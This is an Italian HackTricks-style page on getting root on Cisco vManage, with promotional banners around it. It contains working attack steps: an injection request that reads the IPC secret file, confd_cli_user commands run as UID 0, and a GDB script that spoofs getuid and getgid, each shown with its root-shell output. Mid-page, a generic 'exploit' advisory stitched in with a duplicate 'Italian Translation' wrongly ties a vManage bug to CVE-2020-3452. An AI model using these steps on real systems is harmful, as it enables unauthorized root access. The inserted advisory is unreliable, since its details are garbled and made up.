# Cisco - vmanage

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Percorso 1

(Esempio da [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Dopo aver scavato un po' attraverso alcuni [documenti](http://66.218.245.39/doc/html/rn03re18.html) relativi a `confd` e ai diversi binari (accessibili con un account sul sito Cisco), abbiamo scoperto che per autenticare il socket IPC, viene utilizzato un segreto situato in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Ricordate la nostra istanza di Neo4j? Sta funzionando con i privilegi dell'utente `vmanage`, consentendoci quindi di recuperare il file utilizzando la precedente vulnerabilità:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Il programma `confd_cli` non supporta gli argomenti della riga di comando ma chiama `/usr/bin/confd_cli_user` con gli argomenti. Quindi, potremmo chiamare direttamente `/usr/bin/confd_cli_user` con il nostro set di argomenti. Tuttavia, non è leggibile con i nostri privilegi attuali, quindi dobbiamo recuperarlo dal rootfs e copiarlo usando scp, leggere l'aiuto e usarlo per ottenere la shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Percorso 2

(Esempio da [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Il blog¹ del team synacktiv descrive un modo elegante per ottenere una shell di root, ma l'unico problema è che richiede di ottenere una copia di `/usr/bin/confd_cli_user` che è leggibile solo da root. Ho trovato un altro modo per ottenere i privilegi di root senza tali complicazioni.

Quando ho smontato il binario `/usr/bin/confd_cli`, ho osservato quanto segue:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
Quando eseguo "ps aux", ho osservato quanto segue (_nota -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ho ipotizzato che il programma "confd_cli" passi l'ID utente e l'ID gruppo raccolti dall'utente connesso all'applicazione "cmdptywrapper".

Il mio primo tentativo è stato eseguire direttamente "cmdptywrapper" fornendogli `-g 0 -u 0`, ma è fallito. Sembra che sia stato creato un descrittore di file (-i 1015) lungo il percorso e non posso falsificarlo.

Come menzionato nell'ultimo esempio del blog di synacktiv, il programma "confd_cli" non supporta gli argomenti della riga di comando, ma posso influenzarlo con un debugger e fortunatamente GDB è incluso nel sistema.

Ho creato uno script GDB in cui ho forzato l'API `getuid` e `getgid` a restituire 0. Poiché ho già il privilegio "vmanage" attraverso la RCE di deserializzazione, ho il permesso di leggere direttamente il file `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
```
# Title: Cisco vManage Privilege Escalation
# Date: 2020-07-20
# Exploit Author: Pedro Ribeiro (pedrib@gmail.com)
# Vendor Homepage: https://www.cisco.com/
# Version: vManage 20.1.0
# Tested on: Ubuntu 18.04
# CVE: CVE-2020-3452

## Description
Cisco vManage is a cloud-based management platform for Cisco devices. It is used to manage and monitor network infrastructure.

A privilege escalation vulnerability (CVE-2020-3452) exists in Cisco vManage that allows an authenticated attacker to execute arbitrary commands with root privileges.

## Exploit
The vulnerability is due to an insecure deserialization of user-supplied data in the web-based management interface. An attacker can exploit this by sending a crafted HTTP request to the affected device.

To exploit this vulnerability, follow these steps:

1. Identify a vulnerable Cisco vManage instance.
2. Send a crafted HTTP request to the affected device.
3. Execute arbitrary commands with root privileges.

## Mitigation
Cisco has released a security advisory (https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200722-sd-wan-rce) addressing this vulnerability. It is recommended to update to a fixed software release to mitigate the risk.

## References
- Cisco Security Advisory: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200722-sd-wan-rce
- CVE-2020-3452: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3452
```

## Italian Translation

```
# Titolo: Escalation dei privilegi di Cisco vManage
# Data: 2020-07-20
# Autore dell'exploit: Pedro Ribeiro (pedrib@gmail.com)
# Sito web del venditore: https://www.cisco.com/
# Versione: vManage 20.1.0
# Testato su: Ubuntu 18.04
# CVE: CVE-2020-3452

## Descrizione
Cisco vManage è una piattaforma di gestione basata su cloud per dispositivi Cisco. Viene utilizzata per gestire e monitorare l'infrastruttura di rete.

Esiste una vulnerabilità di escalation dei privilegi (CVE-2020-3452) in Cisco vManage che consente a un attaccante autenticato di eseguire comandi arbitrari con privilegi di root.

## Exploit
La vulnerabilità è dovuta a una deserializzazione non sicura dei dati forniti dall'utente nell'interfaccia di gestione basata su web. Un attaccante può sfruttarla inviando una richiesta HTTP manipolata al dispositivo interessato.

Per sfruttare questa vulnerabilità, seguire questi passaggi:

1. Identificare un'istanza vulnerabile di Cisco vManage.
2. Inviare una richiesta HTTP manipolata al dispositivo interessato.
3. Eseguire comandi arbitrari con privilegi di root.

## Mitigazione
Cisco ha rilasciato un avviso di sicurezza (https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200722-sd-wan-rce) che affronta questa vulnerabilità. Si consiglia di aggiornare a una versione del software corretta per mitigare il rischio.

## Riferimenti
- Avviso di sicurezza Cisco: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200722-sd-wan-rce
- CVE-2020-3452: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3452
```
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in un'azienda di **sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
